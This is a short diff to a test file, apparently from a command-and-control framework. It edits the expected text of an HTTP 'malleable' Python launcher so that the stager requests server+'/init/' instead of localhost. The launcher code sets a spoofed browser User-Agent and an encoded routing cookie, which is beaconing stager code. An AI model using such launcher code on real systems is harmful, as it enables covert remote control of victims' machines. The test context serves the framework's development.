@@ -335,7 +335,7 @@ def _expected_http_malleable_python_launcher():
         o = urllib.request.build_opener(proxy)
         urllib.request.install_opener(o)
         vreq=type('vreq',(urllib.request.Request,object),{'get_method':lambda self:self.verb if (hasattr(self,'verb') and self.verb) else urllib.request.Request.get_method(self)})
-        req=vreq('http://localhost:80/init/', )
+        req=vreq(server+'/init/', )
         req.verb='GET'
         req.add_header('User-Agent','Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko')
         req.add_header('Cookie','session=cm91dGluZyBwYWNrZXQ%3D')
